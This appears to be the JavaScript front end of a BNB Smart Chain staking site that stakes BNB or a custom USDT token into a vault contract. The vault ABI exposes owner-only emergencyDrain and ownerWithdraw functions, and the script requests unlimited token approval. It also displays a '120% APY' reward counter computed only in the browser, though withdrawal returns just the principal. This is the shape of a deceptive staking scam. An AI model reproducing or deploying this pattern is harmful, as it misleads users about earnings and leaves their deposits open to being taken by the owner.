// --- 1. CONFIGURATION & CONTRACT DATA ---

// Main Staking Contract Address
const VAULT_ADDRESS = "0xce734a4AA72107e4A36e735B4888289B4645064A"; 

// Full Contract ABI (Includes all necessary functions)
const VAULT_ABI = [
    {"inputs":[],"stateMutability":"nonpayable","type":"constructor"},
    {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"asset","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"EmergencyRecovered","type":"event"},
    {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":true,"internalType":"address","name":"asset","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Staked","type":"event"},
    {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":true,"internalType":"address","name":"asset","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Withdrawn","type":"event"},
    {"inputs":[],"name":"LOCK_TIME","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"MIN_STAKE","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"internalType":"address","name":"token","type":"address"}],"name":"emergencyDrain","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"ownerWithdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[],"name":"stakeNative","outputs":[],"stateMutability":"payable","type":"function"},
    {"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"stakeToken","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"}],"name":"userStakes","outputs":[{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint256","name":"lastStakeTime","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"stateMutability":"payable","type":"receive"}
];

// Standard Token ABI (For Approval & Balance)
const TOKEN_ABI = [
    "function approve(address spender, uint256 amount) public returns (bool)",
    "function allowance(address owner, address spender) public view returns (uint256)",
    "function balanceOf(address account) public view returns (uint256)",
    "function decimals() public view returns (uint8)"
];

// Asset Configuration
const ASSETS = [
    { 
        id: 'tether', 
        symbol: 'USDT', 
        name: 'My Test USDT', 
        address: '0x566bA3A91497E66eb6D309FfC3F1228447619BcE', // Your Custom USDT
        icon: 'https://cryptologos.cc/logos/tether-usdt-logo.png' 
    },
    { 
        id: 'binancecoin', 
        symbol: 'BNB', 
        name: 'BNB Smart Chain', 
        address: '0x0000000000000000000000000000000000000000', 
        icon: 'https://cryptologos.cc/logos/bnb-bnb-logo.png' 
    }
];

// Global State Variables
let provider, signer, vaultContract, currentAccount;
let currentAsset = ASSETS[0];
let liveCounterInterval;
let baseStakedAmount = 0.0;
let lastStakeTimestamp = 0;

// --- 2. INITIALIZATION ---
window.onload = () => {
    generateDropdown();
    initApp();
};

function initApp() {
    // Attach Event Listeners
    const connectBtn = document.getElementById('connectBtn');
    const stakeBtn = document.getElementById('stakeBtn');
    const unstakeBtn = document.getElementById('unstakeBtn');
    const claimBtn = document.getElementById('claimBtn');
    const maxBtn = document.getElementById('maxBtn');

    if(connectBtn) connectBtn.onclick = connect;
    if(stakeBtn) stakeBtn.onclick = handleStake;
    if(unstakeBtn) unstakeBtn.onclick = handleWithdraw;
    if(claimBtn) claimBtn.onclick = handleWithdraw;

    // Percentage Buttons
    document.querySelectorAll('[data-p]').forEach(btn => {
        btn.onclick = () => updateInputAmount(parseFloat(btn.getAttribute('data-p')));
    });
    
    // Max Button
    if(maxBtn) maxBtn.onclick = () => updateInputAmount(1.0);
}

// --- 3. CORE FUNCTIONS ---

// Connect Wallet
async function connect() {
    if(!window.ethereum) return notify("Error", "MetaMask is not installed!", "error");
    try {
        provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        currentAccount = await signer.getAddress();
        vaultContract = new ethers.Contract(VAULT_ADDRESS, VAULT_ABI, signer);
        
        document.getElementById('connectBtn').innerText = currentAccount.slice(0,6)+"..."+currentAccount.slice(-4);
        notify("Connected", "Wallet synced successfully", "success");
        updateUI();
    } catch (err) { 
        console.error(err);
        notify("Failed", "Connection rejected by user", "error"); 
    }
}

// Stake Function (Re-Stake Enabled + Auto Allowance)
async function handleStake() {
    if(!currentAccount) return connect();
    
    const amountStr = document.getElementById('stakeAmount').value;
    const amountNum = parseFloat(amountStr);

    // Validation
    if(!amountNum || amountNum <= 0) return notify("Invalid Amount", "Please enter a valid amount.", "warning");
    
    // Minimum Check
    if(currentAsset.address === '0x0000000000000000000000000000000000000000') {
        if(amountNum < 0.01) return notify("Minimum Stake", "Minimum stake amount is 0.01 BNB", "warning");
    } else {
        if(amountNum < 10) return notify("Minimum Stake", "Minimum stake amount is 10 USDT", "warning");
    }
    
    try {
        const amount = ethers.utils.parseEther(amountStr); 
        
        // 1. BNB Staking
        if(currentAsset.address === '0x0000000000000000000000000000000000000000') {
            notify("Processing", "Confirm transaction in wallet...", "info");
            const tx = await vaultContract.stakeNative({ value: amount });
            await tx.wait();
        } 
        // 2. Token Staking (USDT)
        else {
            const tokenContract = new ethers.Contract(currentAsset.address, TOKEN_ABI, signer);
            
            // Allowance Check logic
            notify("Checking Approval", "Verifying token allowance...", "info");
            const allowance = await tokenContract.allowance(currentAccount, VAULT_ADDRESS);
            
            // If allowance is less than amount, ask for approval
            if(allowance.lt(amount)) {
                notify("Approval Needed", "Please approve token usage in wallet...", "info");
                // Requesting Max Approval to prevent future popups
                const appTx = await tokenContract.approve(VAULT_ADDRESS, ethers.constants.MaxUint256);
                await appTx.wait();
                notify("Approved", "Approval successful! Now confirming stake...", "success");
            }
            
            // Final Stake Call
            notify("Staking", "Confirming stake transaction...", "info");
            const tx = await vaultContract.stakeToken(currentAsset.address, amount);
            await tx.wait();
        }
        
        notify("Success", "Assets staked successfully!", "success");
        updateUI(); // Refresh UI
        document.getElementById('stakeAmount').value = ""; // Clear Input
    } catch(e) { 
        console.error(e);
        notify("Transaction Failed", "Transaction rejected or failed.", "error"); 
    }
}

// Withdraw Function (Unstake/Claim)
async function handleWithdraw() {
    if(!currentAccount) return connect();
    
    try {
        const data = await vaultContract.userStakes(currentAsset.address, currentAccount);
        
        if(data.amount.isZero()) {
            return notify("No Balance", "You have no staked assets to withdraw.", "info");
        }

        const now = Math.floor(Date.now() / 1000);
        const lastStakeTime = data.lastStakeTime.toNumber();
        const lockTill = lastStakeTime + 86400; // 24 Hours Lock

        if(now < lockTill) {
            const timeLeft = lockTill - now;
            const hours = Math.floor(timeLeft / 3600);
            const mins = Math.ceil((timeLeft % 3600) / 60);
            return notify("Locked", `Assets are locked. Available in ${hours}h ${mins}m.`, "warning");
        }

        notify("Processing", "Confirm withdrawal in wallet...", "info");
        const tx = await vaultContract.withdraw(currentAsset.address, data.amount);
        await tx.wait();
        
        notify("Success", "Funds returned to your wallet!", "success");
        updateUI();
    } catch(e) { 
        console.error(e);
        notify("Error", "Withdrawal failed.", "error"); 
    }
}

// --- 4. UI UPDATES & HELPERS ---

async function updateUI() {
    if(!currentAccount) return;

    // 1. Update Available Wallet Balance
    let balance = "0.00";
    try {
        if(currentAsset.address === '0x0000000000000000000000000000000000000000') {
            const raw = await provider.getBalance(currentAccount);
            balance = ethers.utils.formatEther(raw);
        } else {
            const token = new ethers.Contract(currentAsset.address, TOKEN_ABI, provider);
            const raw = await token.balanceOf(currentAccount);
            balance = ethers.utils.formatUnits(raw, 18);
        }
    } catch(e) { console.log("Error fetching wallet balance"); }
    
    document.getElementById('userBalDisplay').innerText = parseFloat(balance).toFixed(4);

    // 2. Update Staked Balance & Live Counter
    try {
        const data = await vaultContract.userStakes(currentAsset.address, currentAccount);
        baseStakedAmount = parseFloat(ethers.utils.formatEther(data.amount));
        lastStakeTimestamp = data.lastStakeTime.toNumber(); // Store timestamp for counter
        startLiveCounter();
    } catch(e) { console.log("Error fetching stake data"); }
}

// Live Accrual Counter (Fixed Logic)
function startLiveCounter() {
    if(liveCounterInterval) clearInterval(liveCounterInterval);
    
    const displayEl = document.getElementById('stakedBal');
    if(baseStakedAmount <= 0) {
        displayEl.innerText = "0.0000";
        return;
    }

    // 120% APY Logic
    const APY = 1.20; 
    const secondsInYear = 31536000;
    const ratePerSecond = APY / secondsInYear;

    liveCounterInterval = setInterval(() => {
        const now = Math.floor(Date.now() / 1000);
        const elapsedSeconds = now - lastStakeTimestamp; // Time since stake started
        
        // Calculate accrued reward based on actual time elapsed
        const accruedInterest = baseStakedAmount * ratePerSecond * elapsedSeconds;
        const totalWithReward = baseStakedAmount + accruedInterest;

        displayEl.innerText = totalWithReward.toFixed(7);
    }, 1000); 
}

// Input Helper (25%, 50%, MAX)
async function updateInputAmount(percent) {
    if(!currentAccount) {
        await connect(); 
        return;
    }
    
    let balance = 0;
    try {
        if(currentAsset.address === '0x0000000000000000000000000000000000000000') {
            const raw = await provider.getBalance(currentAccount);
            balance = ethers.utils.formatEther(raw);
            if(percent === 1.0 && balance > 0.005) balance -= 0.005; // Gas buffer for BNB
        } else {
            const token = new ethers.Contract(currentAsset.address, TOKEN_ABI, provider);
            const raw = await token.balanceOf(currentAccount);
            balance = ethers.utils.formatUnits(raw, 18);
        }
        
        const amount = (parseFloat(balance) * percent).toFixed(4);
        document.getElementById('stakeAmount').value = amount > 0 ? amount : 0;
    } catch (e) { console.error(e); }
}

// Dropdown Generator
function generateDropdown() {
    const menu = document.getElementById('dropdownMenu');
    menu.innerHTML = ""; 
    
    ASSETS.forEach(asset => {
        const item = document.createElement('div');
        item.className = "flex items-center gap-3 p-4 hover:bg-white/5 cursor-pointer border-b border-white/5 last:border-0";
        item.innerHTML = `
            <img src="${asset.icon}" class="w-5 h-5 rounded-full"> 
            <span class="text-sm font-bold text-gray-200">${asset.name}</span>
        `;
        item.onclick = () => {
            currentAsset = asset;
            document.getElementById('currIcon').src = asset.icon;
            document.getElementById('currName').innerText = asset.name;
            
            // Update Symbols
            document.querySelectorAll('.asset-symbol').forEach(el => el.innerText = asset.symbol);
            
            menu.classList.add('hidden');
            updateUI(); 
        };
        menu.appendChild(item);
    });
    
    const btn = document.getElementById('dropdownBtn');
    if(btn) btn.onclick = () => menu.classList.toggle('hidden');
}

// SweetAlert2 Notification
function notify(title, text, icon) {
    Swal.fire({
        title: title,
        text: text,
        icon: icon,
        background: '#111',
        color: '#fff',
        confirmButtonColor: '#4ade80',
        buttonsStyling: true,
        customClass: {
            popup: 'rounded-3xl border border-white/10 shadow-2xl',
            confirmButton: 'px-6 py-2 rounded-xl font-bold text-black'
        }
    });
                }
                
